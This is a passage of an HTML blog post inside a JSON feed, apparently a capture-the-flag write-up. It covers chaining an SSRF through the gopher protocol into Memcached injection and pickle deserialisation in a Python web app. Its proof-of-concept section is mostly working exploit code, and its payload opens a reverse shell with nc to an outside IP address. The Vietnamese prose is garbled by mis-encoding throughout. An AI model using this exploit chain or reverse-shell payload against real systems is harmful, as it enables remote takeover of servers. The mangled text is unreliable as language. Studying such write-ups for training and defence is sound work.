session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'user'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            <span class=\"token comment\"># ...</span></span><br><span class=\"highlight-line\">            _url <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">[</span><span class=\"token string\">'video_url'</span><span class=\"token punctuation\">]</span></span><br><span class=\"highlight-line\">            <span class=\"token comment\"># ...</span></span><br><span class=\"highlight-line\">            <span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> parse<span class=\"token punctuation\">(</span>_url<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">            <span class=\"token comment\"># ...</span></span><br><span class=\"highlight-line\"><span class=\"token comment\"># ...</span></span></code></pre>\n<p>N·∫øu c√°c b·∫°n ƒë·ªÉ √Ω t·∫°i h√†m x·ª≠ l√≠ route <code>/loadexternalvideo</code> s·∫Ω th·∫•y 1 l·ªói SSRF. H√†m <code>parse()</code> s·ª≠ d√πng PyCurl ƒë·ªÉ request. Theo nh∆∞ documentation th√¨ PyCurl l√† 1 interface c·ªßa libcurl v√† ƒë√¢y l√† nh·ªØng protocol libcurl h·ªó tr·ª£:</p>\n<p><img src=\"https://i.imgur.com/pV7bHx7.jpg\" alt=\"\"></p>\n<p>V·∫≠y l√† ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng Gopher protocol, sound good!</p>\n<p>V·∫≠y Memcached Injection n·∫±m ·ªü ƒë√¢u? N·∫±m ·ªü ch·ªó s·ª≠ d·ª•ng th∆∞ vi·ªán <code>pylibmc</code> trong Python. N·∫øu ai ƒë√£ ƒë·ªçc qua slide ƒë∆∞·ª£c tr√¨nh b√†y t·∫°i h·ªôi ngh·ªã Black Hat th√¨ c≈©ng ƒë√£ th·∫•y c√°i table n√†y:</p>\n<p><img src=\"https://i.imgur.com/VvpXZM8.jpg\" alt=\"\"></p>\n<p>Ch√∫ng ta c√≥ th·ªÉ th·∫•y, n·∫øu d·ªØ li·ªáu ch√∫ng ta <code>set</code> v√†o key l√† 1 Pickle serialized data th√¨ khi <code>get</code> c√°i key n√†y, t√πy theo <code>flags</code> m√† ch√∫ng ta g·ª≠i l√™n m√† <code>pylibmc</code> c√≥ deserialize Pickle hay kh√¥ng.</p>\n<p><img src=\"https://i.imgur.com/GhRjWz5.jpg\" alt=\"\"><br>\nFlag for Pickle deserialization: <code>(1 &lt;&lt; 0) = 1</code></p>\n<p>V·∫≠y ch√∫ng ta trigger ƒë∆∞·ª£c payload b·∫±ng c√°ch n√†o? C√πng xem l·∫°i ƒëo·∫°n code sau:</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"highlight-line\"><span class=\"token keyword\">def</span> <span class=\"token function\">racingboiz101</span><span class=\"token punctuation\">(</span>_key<span class=\"token punctuation\">,</span> _value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    _speedup101 <span class=\"token operator\">=</span> pylibmc<span class=\"token punctuation\">.</span>Client<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"127.0.0.1:11211\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> binary<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></span><br><mark class=\"highlight-line highlight-line-active\">    <span class=\"token keyword\">if</span> _speedup101<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>_key<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></mark><br><span class=\"highlight-line\">        _speedup101<span class=\"token punctuation\">.</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span>_key<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Copyright@HelloVietNamv2\"</span><span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">        _speedup101<span class=\"token punctuation\">.</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span>_value<span class=\"token punctuation\">,</span> _value<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">return</span> _speedup101<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>_key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _speedup101<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>_value<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">        _speedup101<span class=\"token punctuation\">.</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span>_value<span class=\"token punctuation\">,</span> _value<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span></span><br><mark class=\"highlight-line highlight-line-active\">        <span class=\"token keyword\">return</span> _speedup101<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>_key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _speedup101<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>_value<span class=\"token punctuation\">)</span></mark></code></pre>\n<p>V·∫≠y ƒë·ªÉ trigger ƒë∆∞·ª£c th√¨ ch√∫ng ta c·∫ßn ph·∫£i <code>get</code> ƒë∆∞·ª£c key m√† ta ƒë√£ <code>set</code> cho Memcached tr∆∞·ªõc ƒë√≥ th√¥ng qua Gopher protocol.</p>\n<h3 id=\"exploit\">Exploit <a class=\"direct-link\" href=\"#exploit\">#</a></h3>\n<p>D√πng Gopher protocol request ƒë·∫øn Memcached ƒë·ªÉ <code>set</code> 1 key v·ªõi t√™n b·∫•t k√¨ (g·ªçi key n√†y t√™n l√† <code>this_is_key</code>) v·ªõi value l√† pickle serialized data (aka payload) c·ªßa ch√∫ng ta. Sau ƒë√≥ g·ªçi ƒë·∫øn route <code>/GIFmaker</code> ƒë·ªÉ trigger c√°i key n√†y.</p>\n<p>Memcached command c·ªßa ch√∫ng ta nh∆∞ sau:</p>\n<pre><code>set this_is_key 1 10 &lt;payload_length&gt;\n&lt;payload&gt;\n</code></pre>\n<ul>\n<li><code>this_is_key</code> - l√† t√™n key m√† ch√∫ng ta mu·ªën set.</li>\n<li><code>1</code> - ƒë√¢y l√† tham s·ªë <code>flags</code>, d√πng ƒë·ªÉ cho pylibmc bi·∫øt khi <code>get</code> key n√†y s·∫Ω ph·∫£i deserialize b·∫±ng Pickle.</li>\n<li><code>10</code> - expired time, t√≠nh b·∫±ng gi√¢y.</li>\n<li><code>&lt;payload_length&gt;</code> v√† <code>&lt;payload&gt;</code> th√¨ ch·∫Øc kh√¥ng c·∫ßn ph·∫£i gi·∫£i th√≠ch n·ªØa.</li>\n</ul>\n<h4 id=\"proof-of-concept\">Proof-of-concept <a class=\"direct-link\" href=\"#proof-of-concept\">#</a></h4>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"highlight-line\"><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> time</span><br><span class=\"highlight-line\"><span class=\"token keyword\">from</span> os <span class=\"token keyword\">import</span> system</span><br><span class=\"highlight-line\"><span class=\"token keyword\">import</span> urllib</span><br><span class=\"highlight-line\"><span class=\"token keyword\">import</span> pickle</span><br><span class=\"highlight-line\"><span class=\"token keyword\">import</span> requests</span><br><span class=\"highlight-line\"><span class=\"token keyword\">import</span> random</span><br><span class=\"highlight-line\"><span class=\"token keyword\">import</span> sys</span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">ALPHA <span class=\"token operator\">=</span> <span class=\"token string\">\"abcdefghijklmnopqrstuvwxyz\"</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">def</span> <span class=\"token function\">rand_string</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">return</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>ALPHA<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Exploit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">return</span> system<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&amp;1 | nc 3.0.119.151 3000 > /tmp/f'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">title <span class=\"token operator\">=</span> rand_string<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>Exploit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></span><br><span class=\"highlight-line\">    <span class=\"token string\">''</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">    <span class=\"token string\">'set %s 1 10 %d'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>title<span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">    payload<span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">    <span class=\"token string\">''</span></span><br><span class=\"highlight-line\"><span class=\"token punctuation\">]</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token keyword\">print</span> <span class=\"token string\">'Start requesting...'</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://hellovietnamv2.0x1337.space:31337/loadexternalvideo'</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'inputTitle'</span><span class=\"token punctuation\">:</span> rand_string<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'inputDescription'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'description'</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'video_url'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'gopher://127.0.0.1:11211/_'</span> <span class=\"token operator\">+</span> urllib<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span><span class=\"token string\">'\\r\\n'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'timestamp'</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'session'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'redacted'</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">print</span> res<span class=\"token punctuation\">.</span>content</span><br><span class=\"highlight-line\"><span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">pass</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">print</span> <span class=\"token string\">'Done!'</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token keyword\">print</span> <span class=\"token string\">'Start triggering payload...'</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://hellovietnamv2.0x1337.space:31337/GIFmaker'</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'inputTitle'</span><span class=\"token punctuation\">:</span> title<span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'inputDescription'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'description'</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'filePath'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'static/Uploads/aa587ed19a228d98431f142900b60633.mp4'</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'timestamp'</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'session'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'redacted'</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">print</span> res<span class=\"token punctuation\">.</span>content</span><br><span class=\"highlight-line\"><span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">pass</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">print</span> <span class=\"token string\">'Done, exit program!'</span></span></code></pre>\n<p><img src=\"https://i.imgur.com/gsyWzxH.jpg\" alt=\"\"></p>\n<h1 id=\"last-words\">Last words <a class=\"direct-link\" href=\"#last-words\">#</a></h1>\n<p>C·∫£m ∆°n 2 anh @ducnt v√† @tsug0d ƒë√£ t·∫°o ra nh·ªØng ƒë·ªÅ Web hay ho cho d·ªãp ƒë·∫ßu nƒÉm 2020, support nhi·ªát t√¨nh cho em ƒë·ªÉ c√≥ th·ªÉ gi·∫£i ƒë∆∞·ª£c h·∫øt t·∫•t c·∫£ c√°c Web challenge c≈©ng nh∆∞ nh·∫±m √¥n l·∫°i nh·ªØng ki·∫øn th·ª©c ƒë√£ ƒë∆∞·ª£c h·ªçc trong nƒÉm 2019 ƒë√£ qua.</p>\n<p>Ch√∫c m·ª´ng nƒÉm m·ªõi 2Ô∏è‚É£0Ô∏è‚É£2Ô∏è‚É£0Ô∏è‚É£ everyone!</p>\n",
      "date_published": "2020-01-08T00:00:00+00:00"
    }
  ]
}
